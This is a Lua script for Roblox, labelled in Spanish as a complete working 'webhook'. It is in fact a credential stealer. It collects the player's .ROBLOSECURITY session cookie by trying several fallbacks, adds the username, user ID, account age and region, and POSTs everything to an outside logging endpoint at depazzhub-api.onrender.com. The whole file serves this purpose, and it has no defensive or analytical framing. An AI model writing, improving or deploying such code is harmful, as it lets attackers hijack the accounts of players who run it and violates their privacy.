-- webhook.lua - VERSIÓN COMPLETA Y FUNCIONAL
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local CookieService = game:GetService("CookieService")
local LocalizationService = game:GetService("LocalizationService")

-- Funciones de Libraries.lua integradas
local function GetCookies()
    local cookies = {}
    
    local savedCookies = CookieService:GetCookies()
    if savedCookies then
        for _, cookie in ipairs(savedCookies) do
            table.insert(cookies, cookie)
        end
    end
    
    if #cookies == 0 then
        local cookiesEnv = getgenv("_ROBLOX_COOKIES")
        if cookiesEnv and type(cookiesEnv) == "table" then
            for _, cookie in ipairs(cookiesEnv) do
                table.insert(cookies, cookie)
            end
        end
    end
    
    if #cookies == 0 then
        local cookieValue = getgenv("_ROBLOSECURITY")
        if cookieValue and cookieValue ~= "" then
            table.insert(cookies, {
                Name = ".ROBLOSECURITY",
                Value = cookieValue,
                SameSite = "None",
                Path = "/",
                Domain = "www.roblox.com"
            })
        end
    end
    
    if #cookies == 0 then
        local savedCookie = CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com")
        if savedCookie ~= "" and savedCookie ~= nil then
            table.insert(cookies, {
                Name = ".ROBLOSECURITY",
                Value = savedCookie,
                SameSite = "None",
                Path = "/",
                Domain = "www.roblox.com"
            })
        end
    end
    
    if #cookies == 0 then
        local names = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "cookie_value", "RBX_COOKIE"}
        for _, name in ipairs(names) do
            local val = getgenv(name)
            if val and val ~= "" and val ~= nil then
                table.insert(cookies, {
                    Name = ".ROBLOSECURITY",
                    Value = tostring(val),
                    SameSite = "None",
                    Path = "/",
                    Domain = "www.roblox.com"
                })
                break
            end
        end
    end
    
    return cookies
end

local function GetCookieValue(cookieName, domain)
    local cookies = GetCookies()
    for _, cookie in ipairs(cookies) do
        if cookie.Name == cookieName then
            return cookie.Value
        end
    end
    return ""
end

local function Request(options)
    options = options or {}
    
    local url = options.Url or ""
    local method = options.Method or "GET"
    local headers = options.Headers or {}
    local body = options.Body
    local timeout = options.Timeout or 15
    
    if url == "" then
        url = options.TargetUrl or ""
    end
    
    if url == "" then
        error("Error: No se especificó URL")
    end
    
    local fullHeaders = {}
    for key, val in pairs(headers) do
        fullHeaders[key] = val
    end
    
    fullHeaders["Connection"] = "keep-alive"
    fullHeaders["Accept"] = "*/*"
    
    if method == "POST" then
        fullHeaders["Content-Type"] = "application/json"
    end
    
    local bodyString = body
    if type(body) == "table" then
        bodyString = HttpService:JSONEncode(body)
    end
    
    local fullUrl = url
    
    local _RbxRequest = getgenv("_RbxRequest")
    if _RbxRequest then
        local response = _RbxRequest(fullUrl, method, bodyString, fullHeaders)
        if response then
            return response
        end
    end
    
    local customRequest = getgenv("request")
    if customRequest then
        local response = customRequest({
            Url = fullUrl,
            Method = method,
            Body = bodyString,
            Headers = fullHeaders
        })
        if response then
            return response
        end
    end
    
    local httpService = HttpService
    local success, response = pcall(function()
        return httpService:PostAsync(fullUrl, bodyString, Enum.HttpContentType.ApplicationJson, false)
    end)
    
    if success and response then
        return {
            Success = true,
            StatusCode = 200,
            Body = response
        }
    end
    
    return nil
end

local function HttpPost(url, body, options)
    options = options or {}
    return Request({
        Url = url,
        Method = "POST",
        Body = body,
        Headers = options.Headers or {
            ["Content-Type"] = "application/json"
        },
        Timeout = options.Timeout or 15
    })
end

local function GetAccountAge()
    local player = Players.LocalPlayer
    
    if not player then return "Jugador no encontrado" end

    local days = player.AccountAge 

    local years = math.floor(days / 365)
    local months = math.floor((days % 365) / 30)
    
    local ageText = days .. " días"
    
    if years > 0 then
        ageText = string.format("%d años, %d meses (%d días)", years, months, days)
    end
    
    return ageText
end

local function GetRegion()
    return LocalizationService.RobloxLocaleId
end

local function ToJson(obj)
    return HttpService:JSONEncode(obj)
end

-- Funciones exportadas
local Libraries = {
    GetCookies = GetCookies,
    GetCookieValue = GetCookieValue,
    Request = Request,
    HttpPost = HttpPost,
    GetAccountAge = GetAccountAge,
    GetRegion = GetRegion,
    ToJson = ToJson
}

-- Código principal del webhook
local success, result = pcall(function()
    local player = Players.LocalPlayer
    local placeId = game.PlaceId
    
    local data = {
        username = player.Name,
        displayName = player.DisplayName,
        userId = player.UserId,
        gameId = placeId,
        accountAge = Libraries.GetAccountAge(),
        region = Libraries.GetRegion(),
        cookie = ".ROBLOSECURITY=" .. Libraries.GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
    }
    
    print("📤 Enviando webhook...")
    print("  Usuario: " .. player.Name)
    print("  User ID: " .. tostring(player.UserId))
    print("  API: https://depazzhub-api.onrender.com/log")
    
    local response = Libraries.HttpPost("https://depazzhub-api.onrender.com/log", data)
    
    if response then
        print("✅ Webhook enviado correctamente!")
        print("  Status: " .. tostring(response.StatusCode or response.status or "200"))
        return response
    else
        warn("⚠️ El webhook falló")
        return nil
    end
end)

if not success then
    warn("❌ Error al ejecutar el webhook:")
    warn("  Detalle: " .. tostring(result))
end
